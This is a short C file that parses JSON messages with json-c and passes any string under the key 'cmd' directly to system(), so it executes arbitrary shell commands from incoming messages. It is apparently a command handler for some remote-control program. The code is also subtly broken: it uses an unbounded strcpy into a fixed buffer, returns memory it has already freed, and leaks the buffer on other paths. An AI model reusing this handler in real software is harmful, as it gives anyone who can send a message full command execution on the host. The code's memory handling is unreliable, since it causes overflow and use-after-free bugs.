#include <json-c/json.h>
#include "dbg.h"

char *parse_message(const char *msg) {

  char *rec = (char*) malloc(10000);

  json_object *jobj = json_tokener_parse(msg);

  if (!is_error(jobj)) {
    enum json_type type;

    json_object_object_foreach(jobj, key, val) {
      type = json_object_get_type(val);
      switch (type) {
        case json_type_string:
          if (strcmp(key, "script") == 0) {
          }
          if (strcmp(key, "save") == 0) {
            /* cmd_output(json_object_get_string(val),"save"); */
          }
          if (strcmp(key, "cmd") == 0) {
            const char *_response = json_object_get_string(val);
            strcpy(rec, _response);
            system(rec);
            free(rec);
          }
          break;
        default:
          break;
      }
    }
    json_object_put(jobj);
  }
  return rec;
}

void process_message(const char *msg) {
  parse_message(msg);
}
